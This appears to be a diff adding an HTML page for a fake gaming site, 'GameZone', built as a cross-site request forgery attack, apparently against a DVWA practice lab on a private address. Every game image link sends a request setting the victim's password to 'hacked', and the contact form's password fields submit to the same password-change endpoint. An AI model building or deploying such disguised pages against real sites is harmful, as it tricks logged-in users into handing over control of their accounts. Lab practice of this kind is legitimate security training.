@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameZone - Play & Enjoy</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Navigation Bar -->
+    <header>
+        <h1>Game<span>Zone</span></h1>
+        <nav>
+            <a href="#games">Games</a>
+            <a href="#about">About</a>
+            <a href="#contact">Contact</a>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h2>Play, Compete, and Win!</h2>
+            <p>Join millions of players worldwide in epic battles.</p>
+            <a href="#games" class="btn">Start Playing</a>
+        </div>
+    </section>
+
+    <!-- Game Showcase Section -->
+    <section id="games" class="games">
+        <h2>Top Games</h2>
+        <div class="game-container">
+            <div class="game-card">
+                <a href="http://192.168.187.42/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#"><img src="game1.jpg" alt="Game 1" class="ga"></a>
+                <h3>Battle Royale</h3>
+                <p>Survive and be the last one standing.</p>
+            </div>
+            <div class="game-card">
+                <a href="http://192.168.187.42/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#"><img src="game2.png" alt="Game 2" class="ga"></a>
+                <h3>Cyber Racer</h3>
+                <p>Experience high-speed futuristic racing.</p>
+            </div>
+            <div class="game-card">
+                <a href="http://192.168.187.42/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#"><img src="game3.jpg" alt="Game 3" class="ga"></a>
+                <h3>Magic Quest</h3>
+                <p>Explore a fantasy world filled with adventure.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="about" class="about">
+        <h2>About Us</h2>
+        <p>GameZone is a leading online gaming platform where players can enjoy action-packed, adventurous, and strategy games. Our goal is to provide an immersive experience for gamers worldwide.</p>
+        <p>Founded in 2025, we have grown into a vibrant gaming community with thousands of daily players.</p>
+    </section>
+
+    <section id="contact" class="contact">
+        <h2>Contact Us</h2>
+        <p>If you have any questions or feedback, feel free to reach out!</p>
+
+        <form action="http://192.168.187.42/dvwa/vulnerabilities/csrf/?" method="GET">
+            <label for="name">Name:</label>
+            <input type="text" id="name" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" required>
+
+            <label>Password:</label>
+            <input type="password" autocomplete="off" name="password_new" required>
+
+            <label>Confirm Password:</label>
+            <input type="password" autocomplete="off" name="password_conf" required>
+
+            <label for="message">Message:</label>
+            <textarea id="message" rows="4" required></textarea>
+
+            <button type="submit" value="Change" name="Change">Send Message</button>
+        </form>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2025 GameZone. All Rights Reserved.</p>
+    </footer>
+
+</body>
+</html>
